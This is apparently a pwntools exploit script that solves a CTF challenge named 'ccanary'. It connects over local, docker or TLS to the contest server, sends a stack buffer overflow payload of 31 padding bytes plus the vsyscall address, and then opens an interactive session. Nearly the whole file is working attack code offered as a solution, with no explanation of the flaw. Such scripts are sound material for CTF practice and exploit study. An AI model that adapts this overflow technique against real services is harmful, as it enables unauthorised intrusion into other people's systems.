#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys
import socket,ssl

FILENAME = "ccanary"
LIBCNAME = ""

hosts = ("7b000000667af3ae70356ea1-ccanary.challenge.master.allesctf.net","localhost","localhost")
ports = (31337,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  global c
  pass

## exploit ###########################################

def exploit():
  global c

  c.recvuntil("quote> ")
  pay = b"A" * 31  # 1 for quote
  pay += p64(0xffffffffff600000) # vsyscall
  c.sendline(pay + "\x00")


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.verify_mode = ssl.CERT_REQUIRED
        context.check_hostname = True
        context.load_default_certs()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = context.wrap_socket(s, server_hostname=rhp1["host"])
        ssl_sock.connect((rhp1["host"],rhp1["port"]))
        c = remote.fromsocket(ssl_sock)
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
